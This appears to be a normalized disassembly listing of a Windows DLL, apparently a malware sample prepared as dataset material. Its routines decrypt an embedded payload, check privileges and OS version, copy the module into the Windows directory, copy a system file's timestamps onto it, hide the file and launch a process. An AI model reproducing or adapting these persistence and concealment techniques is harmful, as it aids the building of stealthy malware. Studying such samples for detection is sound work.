mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x8 ]
mov eax [ ebp - 0x8 ]
mov ecx [ edx + eax * 4 ]
push ecx
call [ FreeLibrary@IAT ]
mov ecx [ ebp - 0x8 ]
add ecx 0x1
mov [ ebp - 0x8 ] ecx
sub_10001d90
push ebp
mov ebp esp
sub esp 0x12c
push edi
mov [ ebp - 0x12c ] 0x0
mov ecx 0x4a
xor eax eax
lea edi [ ebp - 0x12b ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ ebp - 0x12c ]
push eax
push 0x12c
call [ GetTempPathA@IAT ]
mov ecx [ ebp + 0x8 ]
push ecx
push 0x0
push rw-data
lea edx [ ebp - 0x12c ]
push edx
call [ GetTempFileNameA@IAT ]
pop edi
mov esp ebp
pop ebp
retn
sub_10001de2
push ebp
mov ebp esp
sub esp 0x330
push edi
mov [ ebp - 0x31c ] 0x0
mov ecx 0x85
xor eax eax
lea edi [ ebp - 0x31b ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov [ ebp - 0x104 ] 0x0
mov ecx 0x40
xor eax eax
lea edi [ ebp - 0x103 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
push 0x103
lea eax [ ebp - 0x104 ]
push eax
mov ecx [ rw-data ]
push ecx
call [ GetModuleFileNameA@IAT ]
lea edx [ ebp - 0x31c ]
push edx
lea eax [ ebp - 0x104 ]
push eax
call sub_10003fb0
add esp 0x8
test eax eax
jne r-xdata
mov ecx [ ebp - 0x114 ]
mov [ ebp - 0x324 ] ecx
mov edx [ ebp - 0x324 ]
mov eax [ ebp - 0x114 ]
add eax [ edx + 0x3c ]
mov [ ebp - 0x328 ] eax
mov ecx [ ebp - 0x328 ]
mov [ ebp - 0x330 ] ecx
mov edx [ ebp - 0x330 ]
mov [ ebp - 0x320 ] edx
mov eax [ ebp - 0x330 ]
sub eax 0x1
mov [ ebp - 0x330 ] eax
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x330 ]
add ecx 0x1
mov [ ebp - 0x330 ] ecx
mov edx [ ebp - 0x320 ]
sub edx [ ebp - 0x330 ]
mov [ ebp - 0x32c ] edx
cmp [ ebp - 0x32c ] 0x5
jle r-xdata
mov eax [ ebp - 0x330 ]
sub eax 0x1
mov [ ebp - 0x330 ] eax
jmp r-xdata
pop edi
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x31c ]
push edx
call sub_10004080
add esp 0x4
mov eax 0x1
mov eax [ ebp - 0x32c ]
push eax
mov ecx [ ebp - 0x330 ]
push ecx
push rw-data
call memcpy
add esp 0xc
mov ecx [ ebp - 0x330 ]
xor edx edx
mov dl [ ecx ]
test edx edx
je r-xdata
sub_10001f1d
push ebp
mov ebp esp
sub esp 0x158
cmp [ rw-data ] 0x0
je r-xdata
call sub_10001de2
mov [ ebp - 0x124 ] rw-data
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x134 ] 0x0
mov eax [ ebp - 0x124 ]
add eax 0x6
mov [ ebp - 0x124 ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx ]
mov [ ebp - 0x134 ] edx
mov eax [ ebp - 0x134 ]
push eax
call ??2@YAPAXI@Z
add esp 0x4
mov [ ebp - 0x150 ] eax
mov ecx [ ebp - 0x150 ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x134 ]
push edx
push 0x0
mov eax [ ebp - 0xc ]
push eax
call memset
add esp 0xc
mov ecx [ ebp - 0x134 ]
push ecx
mov edx [ ebp - 0x124 ]
add edx 0x4
push edx
mov eax [ ebp - 0xc ]
push eax
call memcpy
add esp 0xc
mov ecx [ ebp - 0xc ]
mov edx [ ecx ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x4 ]
push eax
call ??2@YAPAXI@Z
add esp 0x4
mov [ ebp - 0x154 ] eax
mov ecx [ ebp - 0x154 ]
mov [ ebp - 0x18 ] ecx
mov edx [ ebp - 0x4 ]
push edx
push 0x0
mov eax [ ebp - 0x18 ]
push eax
call memset
add esp 0xc
mov [ ebp - 0x14 ] 0x19
lea ecx [ ebp - 0x120 ]
push ecx
call sub_10001d90
add esp 0x4
mov [ ebp - 0x130 ] 0x0
xor edx edx
mov [ ebp - 0x12f ] edx
mov [ ebp - 0x12b ] edx
mov [ ebp - 0x127 ] dx
mov [ ebp - 0x125 ] dl
push 0xa
lea eax [ ebp - 0x130 ]
push eax
mov ecx [ ebp - 0x14 ]
push ecx
call [ _itoa@IAT ]
add esp 0xc
lea edx [ ebp - 0x120 ]
push edx
lea eax [ ebp - 0x130 ]
push eax
push rw-data
push rw-data
call [ WritePrivateProfileStringA@IAT ]
lea ecx [ ebp - 0x120 ]
push ecx
push 0x0
push rw-data
push rw-data
call [ GetPrivateProfileIntA@IAT ]
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x120 ]
push edx
call [ DeleteFileA@IAT ]
mov al [ ebp - 0x8 ]
mov [ ebp - 0x10 ] al
mov [ ebp - 0x1c ] 0x0
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ ebp - 0x1c ]
cmp edx [ ebp - 0x134 ]
jae r-xdata
jmp r-xdata
mov eax [ ebp - 0x134 ]
sub eax 0x4
push eax
mov ecx [ ebp - 0xc ]
add ecx 0x4
push ecx
lea edx [ ebp - 0x4 ]
push edx
mov eax [ ebp - 0x18 ]
push eax
call sub_10004b50
add esp 0x10
test eax eax
jne r-xdata
mov eax [ ebp - 0xc ]
add eax [ ebp - 0x1c ]
xor ecx ecx
mov cl [ eax ]
mov edx [ ebp - 0x10 ]
and edx 0xff
xor ecx edx
mov [ ebp - 0x138 ] cl
mov eax [ ebp - 0x138 ]
and eax 0xff
and eax 0xf
shl eax 0x4
mov ecx [ ebp - 0x138 ]
and ecx 0xff
sar ecx 0x4
add eax ecx
mov edx [ ebp - 0xc ]
add edx [ ebp - 0x1c ]
mov [ edx ] al
jmp r-xdata
mov esp ebp
pop ebp
retn
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov ecx [ ebp - 0x18 ]
mov [ ebp - 0x140 ] ecx
mov edx [ ebp - 0x140 ]
add edx 0x11
mov [ ebp - 0x13c ] edx
mov eax [ ebp - 0x140 ]
mov ecx [ eax ]
mov [ rw-data ] ecx
mov edx [ ebp - 0x13c ]
mov [ rw-data ] edx
mov eax [ ebp - 0x140 ]
mov ecx [ ebp - 0x13c ]
add ecx [ eax ]
mov [ ebp - 0x13c ] ecx
call sub_100025bd
test eax eax
je r-xdata
mov ecx [ ebp - 0x1c ]
add ecx 0x1
mov [ ebp - 0x1c ] ecx
mov eax [ ebp - 0xc ]
mov [ ebp - 0x158 ] eax
mov ecx [ ebp - 0x158 ]
push ecx
call ??3@YAXPAX@Z
add esp 0x4
mov edx [ ebp - 0x140 ]
mov eax [ ebp - 0x13c ]
add eax [ edx + 0x4 ]
mov [ ebp - 0x13c ] eax
mov ecx [ ebp - 0x140 ]
mov edx [ ebp - 0x13c ]
add edx [ ecx + 0x8 ]
mov [ ebp - 0x13c ] edx
mov edx [ ebp - 0x140 ]
mov eax [ edx + 0x4 ]
mov [ rw-data ] eax
mov ecx [ ebp - 0x13c ]
mov [ rw-data ] ecx
mov [ ebp - 0x148 ] 0x50
mov [ ebp - 0x147 ] 0x4c
mov [ ebp - 0x146 ] 0x55
mov [ ebp - 0x145 ] 0x53
mov [ ebp - 0x144 ] 0x55
mov [ ebp - 0x143 ] 0x4e
mov [ ebp - 0x142 ] 0x49
mov [ ebp - 0x141 ] 0x54
push 0x8
lea edx [ ebp - 0x148 ]
push edx
mov eax [ rw-data ]
push eax
mov ecx [ rw-data ]
push ecx
call sub_100014a2
add esp 0x10
mov [ ebp - 0x14c ] eax
cmp [ ebp - 0x14c ] 0xffffffff
je r-xdata
mov eax [ ebp - 0x140 ]
mov ecx [ ebp - 0x13c ]
add ecx [ eax + 0x4 ]
mov [ ebp - 0x13c ] ecx
mov edx [ ebp - 0x140 ]
mov eax [ edx + 0x8 ]
mov [ rw-data ] eax
mov ecx [ ebp - 0x13c ]
mov [ rw-data ] ecx
jmp r-xdata
push 0xc8
push rw-data
mov edx [ ebp - 0x14c ]
add edx 0x8
push edx
call memcpy
add esp 0xc
mov eax [ ebp - 0x140 ]
mov ecx [ eax + 0xc ]
mov [ rw-data ] ecx
mov edx [ ebp - 0x13c ]
mov [ rw-data ] edx
sub_100022ad
push ebp
mov ebp esp
sub esp 0x79c
push esi
push edi
call sub_10001f1d
mov [ ebp - 0x338 ] 0x0
mov ecx 0xcc
xor eax eax
lea edi [ ebp - 0x337 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov [ ebp - 0x4 ] 0x0
push 0xc8
push rw-data
lea eax [ ebp - 0x338 ]
push eax
call memcpy
add esp 0xc
push 0x12c
lea ecx [ ebp - 0x138 ]
push ecx
mov edx [ rw-data ]
push edx
call [ GetModuleFileNameA@IAT ]
mov eax [ ebp + 0x334 ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp + 0x338 ]
mov [ ebp - 0x8 ] ecx
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
cmp [ rw-data ] 0x0
jbe r-xdata
mov edx [ rw-data ]
push edx
call sub_10001530
add esp 0x4
mov [ ebp - 0x33c ] eax
cmp [ ebp - 0x33c ] 0x0
je r-xdata
push rw-data
mov eax [ ebp - 0x33c ]
push eax
call sub_10001bc1
add esp 0x8
mov [ ebp - 0x340 ] eax
cmp [ ebp - 0x340 ] 0x0
jne r-xdata
cmp [ ebp - 0xc ] 0x1
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp - 0xc ] 0x1
je r-xdata
sub esp 0x334
mov ecx 0xcd
lea esi [ ebp - 0x338 ]
mov edi esp
[ edi ] [ esi ]
call [ ebp - 0x340 ]
mov [ ebp - 0x4 ] eax
pop edi
pop esi
mov esp ebp
pop ebp
retn
call sub_100025bd
test eax eax
je r-xdata
cmp [ ebp - 0xc ] 0x3
jne r-xdata
mov [ ebp - 0x344 ] 0x0
push rw-data
mov ecx [ ebp - 0x33c ]
push ecx
call sub_10001bc1
add esp 0x8
mov [ ebp - 0x344 ] eax
cmp [ ebp - 0x344 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
push rw-data
call [ ebp - 0x344 ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov [ ebp - 0x550 ] 0x0
mov ecx 0x81
xor eax eax
lea edi [ ebp - 0x54e ]
[ edi ]
stosw [ edi ]
push 0x103
lea edx [ ebp - 0x550 ]
push edx
mov eax [ rw-data ]
push eax
call [ GetModuleFileNameW@IAT ]
mov ecx 0xe
mov esi rw-data
lea edi [ ebp - 0x79c ]
[ edi ] [ esi ]
mov ecx 0x74
xor eax eax
lea edi [ ebp - 0x764 ]
[ edi ]
lea ecx [ ebp - 0x79c ]
push ecx
lea edx [ ebp - 0x550 ]
push edx
call sub_10001052
add esp 0x8
mov [ ebp - 0x590 ] 0x0
jmp r-xdata
cmp [ ebp - 0x590 ] 0x3c
jae r-xdata
mov [ ebp - 0x58c ] 0x3c
mov [ ebp - 0x588 ] 0x40
mov [ ebp - 0x57c ] rw-data
mov [ ebp - 0x578 ] rw-data
mov [ ebp - 0x574 ] rw-data
mov [ ebp - 0x570 ] 0x5
push rw-data
call [ LoadLibraryW@IAT ]
mov [ ebp - 0x348 ] eax
push rw-data
mov edx [ ebp - 0x348 ]
push edx
call [ GetProcAddress@IAT ]
mov [ ebp - 0x594 ] eax
lea eax [ ebp - 0x58c ]
push eax
call [ ebp - 0x594 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x590 ]
mov [ ebp + ecx - 0x58c ] 0x0
jmp r-xdata
cmp [ ebp - 0x554 ] 0x0
je r-xdata
mov eax [ ebp - 0x590 ]
add eax 0x1
mov [ ebp - 0x590 ] eax
push 0xffffffff
mov ecx [ ebp - 0x554 ]
push ecx
call [ WaitForSingleObject@IAT ]
mov edx [ ebp - 0x554 ]
push edx
call [ CloseHandle@IAT ]
sub_1000255a
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x8
call [ GetCurrentProcess@IAT ]
push eax
call [ OpenProcessToken@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
and eax 0xff
mov esp ebp
pop ebp
retn
mov [ ebp - 0xc ] 0x0
lea ecx [ ebp - 0xc ]
push ecx
push 0x4
mov edx [ ebp + 0x8 ]
push edx
push 0x12
mov eax [ ebp - 0x8 ]
push eax
call [ GetTokenInformation@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x8 ]
push ecx
call [ CloseHandle@IAT ]
mov [ ebp - 0x4 ] 0x1
sub_100025bd
push ebp
mov ebp esp
sub esp 0x2c
push edi
push rw-data
call [ GetModuleHandleA@IAT ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
push rw-data
mov eax [ ebp - 0x8 ]
push eax
call [ GetProcAddress@IAT ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x2c ] 0x0
mov ecx 0x8
xor eax eax
lea edi [ ebp - 0x28 ]
[ edi ]
lea ecx [ ebp - 0x2c ]
push ecx
call [ ebp - 0x4 ]
mov edx [ ebp - 0x2c ]
and edx 0xffff
cmp edx 0x9
je r-xdata
xor eax eax
jmp r-xdata
pop edi
mov esp ebp
pop ebp
retn
mov eax 0x1
jmp r-xdata
mov eax [ ebp - 0x2c ]
and eax 0xffff
cmp eax 0x6
jne r-xdata
xor eax eax
sub_10002659
push ebp
mov ebp esp
sub esp 0x130
push edi
mov [ ebp - 0x4 ] 0x1
push 0x80
mov ecx [ ebp + 0x8 ]
push ecx
call [ SetFileAttributesA@IAT ]
mov edx [ ebp + 0x8 ]
push edx
call [ DeleteFileA@IAT ]
test eax eax
je r-xdata
jmp r-xdata
mov [ ebp - 0x130 ] 0x0
mov ecx 0x4a
xor eax eax
lea edi [ ebp - 0x12f ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
push 0x12c
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x130 ]
push ecx
call [ strncpy@IAT ]
add esp 0xc
push 0x5c
lea edx [ ebp - 0x130 ]
push edx
call [ strrchr@IAT ]
add esp 0x8
mov [ eax + 0x1 ] 0x0
push rw-data
lea eax [ ebp - 0x130 ]
push eax
call strcat
add esp 0x8
lea ecx [ ebp - 0x130 ]
push ecx
call sub_10003f90
add esp 0x4
test eax eax
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x130 ]
push edx
call sub_1000263b
add esp 0x4
test eax eax
je r-xdata
lea edx [ ebp - 0x130 ]
push edx
call sub_1000263b
add esp 0x4
lea eax [ ebp - 0x130 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call [ rename@IAT ]
add esp 0x8
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
xor edx edx
test edx edx
jne r-xdata
lea eax [ ebp - 0x130 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call [ rename@IAT ]
add esp 0x8
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_10003f90
add esp 0x4
test eax eax
jne r-xdata
sub_10002777
push ebp
mov ebp esp
sub esp 0x16c
push edi
push 0x80
mov eax [ ebp + 0x8 ]
push eax
call [ SetFileAttributesA@IAT ]
push 0x10
push 0x0
lea ecx [ ebp - 0x140 ]
push ecx
call memset
add esp 0xc
mov [ ebp - 0x130 ] 0x0
mov ecx 0x4a
xor eax eax
lea edi [ ebp - 0x12f ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
push 0x12c
lea edx [ ebp - 0x130 ]
push edx
call [ GetSystemDirectoryA@IAT ]
push rw-data
lea eax [ ebp - 0x130 ]
push eax
call strcat
add esp 0x8
mov [ ebp - 0x150 ] 0x0
xor ecx ecx
mov [ ebp - 0x14c ] ecx
mov [ ebp - 0x148 ] 0x0
xor edx edx
mov [ ebp - 0x144 ] edx
mov [ ebp - 0x15c ] 0x0
xor eax eax
mov [ ebp - 0x158 ] eax
push 0x0
push 0x80
push 0x3
push 0x0
push 0x1
push 0x80000000
lea ecx [ ebp - 0x130 ]
push ecx
call [ CreateFileA@IAT ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebp - 0x140 ] 0x7d4
mov [ ebp - 0x13e ] 0x8
mov [ ebp - 0x13a ] 0x11
mov [ ebp - 0x138 ] 0x14
mov [ ebp - 0x136 ] 0x0
lea ecx [ ebp - 0x164 ]
push ecx
lea edx [ ebp - 0x140 ]
push edx
call [ SystemTimeToFileTime@IAT ]
lea eax [ ebp - 0x16c ]
push eax
lea ecx [ ebp - 0x164 ]
push ecx
call [ LocalFileTimeToFileTime@IAT ]
mov edx [ ebp - 0x16c ]
mov [ ebp - 0x150 ] edx
mov eax [ ebp - 0x168 ]
mov [ ebp - 0x14c ] eax
mov ecx [ ebp - 0x16c ]
mov [ ebp - 0x15c ] ecx
mov edx [ ebp - 0x168 ]
mov [ ebp - 0x158 ] edx
mov eax [ ebp - 0x16c ]
mov [ ebp - 0x148 ] eax
mov ecx [ ebp - 0x168 ]
mov [ ebp - 0x144 ] ecx
lea edx [ ebp - 0x148 ]
push edx
lea eax [ ebp - 0x15c ]
push eax
lea ecx [ ebp - 0x150 ]
push ecx
mov edx [ ebp - 0x4 ]
push edx
call [ GetFileTime@IAT ]
mov eax [ ebp - 0x4 ]
push eax
call [ CloseHandle@IAT ]
jmp r-xdata
push 0x7
mov edx [ ebp + 0x8 ]
push edx
call [ SetFileAttributesA@IAT ]
pop edi
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x148 ]
push eax
lea ecx [ ebp - 0x15c ]
push ecx
lea edx [ ebp - 0x150 ]
push edx
mov eax [ ebp - 0x154 ]
push eax
call [ SetFileTime@IAT ]
mov ecx [ ebp - 0x154 ]
push ecx
call [ CloseHandle@IAT ]
push 0x0
push 0x80
push 0x3
push 0x0
push 0x2
push 0x40000000
mov edx [ ebp + 0x8 ]
push edx
call [ CreateFileA@IAT ]
mov [ ebp - 0x154 ] eax
cmp [ ebp - 0x154 ] 0x0
je r-xdata
sub_10002976
push ebp
mov ebp esp
sub esp 0x624
push edi
mov [ ebp - 0x268 ] 0x0
mov ecx 0x4a
xor eax eax
lea edi [ ebp - 0x267 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
push 0x12c
lea eax [ ebp - 0x268 ]
push eax
call [ GetWindowsDirectoryA@IAT ]
push rw-data
lea ecx [ ebp - 0x268 ]
push ecx
call strcat
add esp 0x8
lea edx [ ebp - 0x268 ]
push edx
call sub_10002659
add esp 0x4
test eax eax
jne r-xdata
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x0
call sub_10002c6a
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x80
jae r-xdata
mov eax 0x1
jmp r-xdata
mov [ ebp - 0x26c ] 0x1
lea eax [ ebp - 0x26c ]
push eax
call sub_1000255a
add esp 0x4
cmp [ ebp - 0x26c ] 0x3
jne r-xdata
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
pop edi
mov esp ebp
pop ebp
retn
mov [ ebp - 0x8 ] 0x1
mov [ ebp - 0x8 ] 0x2
jmp r-xdata
call sub_100025bd
test eax eax
je r-xdata
mov [ ebp - 0x13c ] 0x0
mov ecx 0x4a
xor eax eax
lea edi [ ebp - 0x13b ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
push 0x12c
lea ecx [ ebp - 0x13c ]
push ecx
mov edx [ rw-data ]
push edx
call [ GetModuleFileNameA@IAT ]
cmp [ ebp - 0x8 ] 0x1
jne r-xdata
mov [ ebp - 0x10 ] 0x1
cmp [ ebp - 0x8 ] 0x2
jne r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax 0x1
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
lea eax [ ebp - 0x268 ]
push eax
mov ecx [ rw-data ]
push ecx
mov edx [ rw-data ]
push edx
call sub_100013e0
add esp 0xc
lea eax [ ebp - 0x268 ]
push eax
call sub_10002777
add esp 0x4
push 0x1
lea eax [ ebp - 0x268 ]
push eax
lea ecx [ ebp - 0x13c ]
push ecx
call [ CopyFileA@IAT ]
lea edx [ ebp - 0x268 ]
push edx
call sub_10002777
add esp 0x4
jmp r-xdata
mov [ ebp - 0x5e0 ] 0x0
mov ecx 0x4a
xor eax eax
lea edi [ ebp - 0x5df ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ ebp - 0x5e0 ]
push eax
call sub_10001d90
add esp 0x4
lea ecx [ ebp - 0x5e0 ]
push ecx
mov edx [ rw-data ]
push edx
mov eax [ rw-data ]
push eax
call sub_100013e0
add esp 0xc
mov [ ebp - 0x3b0 ] 0x0
mov ecx 0x4a
xor eax eax
lea edi [ ebp - 0x3af ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea ecx [ ebp - 0x3b0 ]
push ecx
call sub_10001d90
add esp 0x4
lea edx [ ebp - 0x3b0 ]
push edx
mov eax [ rw-data ]
push eax
mov ecx [ rw-data ]
push ecx
call sub_100013e0
add esp 0xc
mov [ ebp - 0x624 ] 0x0
mov ecx 0x10
xor eax eax
lea edi [ ebp - 0x620 ]
[ edi ]
mov [ ebp - 0x284 ] 0x0
xor edx edx
mov [ ebp - 0x280 ] edx
mov [ ebp - 0x27c ] edx
mov [ ebp - 0x278 ] edx
mov [ ebp - 0x624 ] 0x44
mov [ ebp - 0x5f4 ] 0x0
mov [ ebp - 0x4b4 ] 0x0
mov ecx 0x40
xor eax eax
lea edi [ ebp - 0x4b3 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ ebp - 0x5e0 ]
push eax
lea ecx [ ebp - 0x3b0 ]
push ecx
push rw-data
push 0x103
lea edx [ ebp - 0x4b4 ]
push edx
call [ _snprintf@IAT ]
add esp 0x14
lea eax [ ebp - 0x284 ]
push eax
lea ecx [ ebp - 0x624 ]
push ecx
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea edx [ ebp - 0x4b4 ]
push edx
push 0x0
call [ CreateProcessA@IAT ]
push rw-data
call sub_100040f0
add esp 0x4
mov [ ebp - 0x274 ] eax
push 0x0
mov ecx [ ebp - 0x274 ]
push ecx
lea edx [ ebp - 0x13c ]
push edx
push 0x0
call sub_10004440
add esp 0x10
mov [ ebp - 0x270 ] eax
jmp r-xdata
jmp r-xdata
sub_10002c6a
push ebp
mov ebp esp
sub esp 0xa4
push edi
cmp [ rw-data ] 0x0
je r-xdata
mov [ ebp - 0x9c ] 0x0
mov ecx 0x26
xor eax eax
lea edi [ ebp - 0x98 ]
[ edi ]
mov [ ebp - 0x9c ] 0x9c
lea eax [ ebp - 0x9c ]
push eax
call [ GetVersionExA@IAT ]
mov [ ebp - 0xa0 ] eax
cmp [ ebp - 0xa0 ] 0x0
jne r-xdata
mov eax [ rw-data ]
jmp r-xdata
mov edx [ ebp - 0x8c ]
mov [ ebp - 0xa4 ] edx
cmp [ ebp - 0xa4 ] 0x1
je r-xdata
mov [ ebp - 0x9c ] 0x94
lea ecx [ ebp - 0x9c ]
push ecx
call [ GetVersionExA@IAT ]
test eax eax
jne r-xdata
pop edi
mov esp ebp
pop ebp
retn
xor eax eax
jmp r-xdata
cmp [ ebp - 0xa4 ] 0x2
je r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp - 0x98 ] 0x5
jne r-xdata
jmp r-xdata
cmp [ ebp - 0x98 ] 0x5
jne r-xdata
cmp [ ebp - 0x94 ] 0x2
jne r-xdata
mov [ rw-data ] 0x0
xor eax eax
cmp [ ebp - 0x98 ] 0x5
jne r-xdata
cmp [ ebp - 0x94 ] 0x1
jne r-xdata
mov [ rw-data ] 0x40
mov eax 0x40
jmp r-xdata
cmp [ ebp - 0x98 ] 0x6
jne r-xdata
cmp [ ebp - 0x94 ] 0x0
jne r-xdata
mov [ rw-data ] 0x20
mov eax 0x20
jmp r-xdata
cmp [ ebp - 0x98 ] 0x6
jne r-xdata
cmp [ ebp - 0x94 ] 0x0
jne r-xdata
mov [ rw-data ] 0x10
mov eax 0x10
jmp r-xdata
cmp [ ebp - 0x98 ] 0x4
ja r-xdata
cmp [ ebp - 0x94 ] 0x1
jne r-xdata
mov eax [ ebp - 0x2 ]
and eax 0xff
cmp eax 0x1
jne r-xdata
jmp r-xdata
mov [ rw-data ] 0x8
mov eax 0x8
jmp r-xdata
mov [ rw-data ] 0x100
mov eax 0x100
jmp r-xdata
mov [ rw-data ] 0x200
mov eax 0x200
jmp r-xdata
mov [ rw-data ] 0x80
mov eax 0x80
jmp r-xdata
sub_10002e20
push ebp
mov ebp esp
sub esp 0x118
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ rw-data ]
push ecx
call [ GetProcAddress@IAT ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
call sub_10003d90
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp + 0x8 ]
shr edx 0x10
and edx 0xffff
test edx edx
jne r-xdata
push 0xffffffff
call [ ExitProcess@IAT ]
push 0xfffffffe
call [ ExitProcess@IAT ]
mov eax [ ebp + 0x8 ]
push eax
push rw-data
lea ecx [ ebp - 0x118 ]
push ecx
call [ wsprintfA@IAT ]
add esp 0xc
lea edx [ ebp - 0x118 ]
mov [ ebp + 0x8 ] edx
sub_10002ea0
push ebp
mov ebp esp
mov eax 0x12f8
call sub_10003e10
push ebx
push esi
push edi
mov [ ebp - 0x12c ] 0x0
mov ecx 0x4a
xor eax eax
lea edi [ ebp - 0x12b ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
push 0x12b
lea eax [ ebp - 0x12c ]
push eax
push 0x0
call [ GetModuleFileNameA@IAT ]
lea ecx [ ebp - 0x12c ]
push ecx
call [ _strlwr@IAT ]
add esp 0x4
cmp [ ebp + 0xc ] 0x1
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
cmp [ ebp + 0xc ] 0x2
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ rw-data ] edx
mov [ rw-data ] 0x1
mov [ ebp - 0x6b8 ] 0x0
mov ecx 0xcc
xor eax eax
lea edi [ ebp - 0x6b7 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov [ ebp - 0x6bc ] 0x0
mov [ ebp - 0x6bc ] ebp
mov eax [ ebp - 0x6bc ]
mov ecx [ eax ]
mov [ ebp - 0x6bc ] ecx
mov edx [ ebp - 0x6bc ]
mov eax [ edx + 0x4 ]
mov [ ebp - 0x388 ] eax
mov [ ebp - 0x384 ] 0x0
mov ecx 0x4a
xor eax eax
lea edi [ ebp - 0x383 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
push 0x12b
lea ecx [ ebp - 0x384 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call [ GetModuleFileNameA@IAT ]
mov [ ebp - 0x7e8 ] 0x0
mov ecx 0x4a
xor eax eax
lea edi [ ebp - 0x7e7 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov [ ebp - 0x258 ] 0x0
mov ecx 0x4a
xor eax eax
lea edi [ ebp - 0x257 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
push 0x12c
lea eax [ ebp - 0x258 ]
push eax
call [ GetWindowsDirectoryA@IAT ]
lea ecx [ ebp - 0x258 ]
push ecx
push rw-data
push 0x12b
lea edx [ ebp - 0x7e8 ]
push edx
call [ _snprintf@IAT ]
add esp 0x10
push rw-data
lea eax [ ebp - 0x12c ]
push eax
call [ strstr@IAT ]
add esp 0x8
test eax eax
je r-xdata
mov eax 0x1
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
push rw-data
lea ecx [ ebp - 0x12c ]
push ecx
call [ strstr@IAT ]
add esp 0x8
test eax eax
je r-xdata
lea ecx [ ebp - 0x7e8 ]
push ecx
lea edx [ ebp - 0x384 ]
push edx
call [ _stricmp@IAT ]
add esp 0x8
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov eax 0x1
mov [ ebp - 0x12f8 ] 0x0
mov ecx 0xcc
xor eax eax
lea edi [ ebp - 0x12f7 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov [ ebp - 0xfcc ] 0x2
sub esp 0x334
mov ecx 0xcd
lea esi [ ebp - 0x12f8 ]
mov edi esp
[ edi ] [ esi ]
call sub_100022ad
add esp 0x334
mov [ ebp - 0x38c ] 0x1
sub esp 0x334
mov ecx 0xcd
lea esi [ ebp - 0x6b8 ]
mov edi esp
[ edi ] [ esi ]
call sub_100022ad
add esp 0x334
lea eax [ ebp - 0x7e8 ]
push eax
lea ecx [ ebp - 0x384 ]
push ecx
call [ _stricmp@IAT ]
add esp 0x8
test eax eax
je r-xdata
mov [ ebp - 0xe98 ] 0x0
mov ecx 0x4a
xor eax eax
lea edi [ ebp - 0xe97 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
push 0x12b
lea edx [ ebp - 0xe98 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call [ GetModuleFileNameA@IAT ]
mov [ ebp - 0xd6c ] 0x0
mov ecx 0x4a
xor eax eax
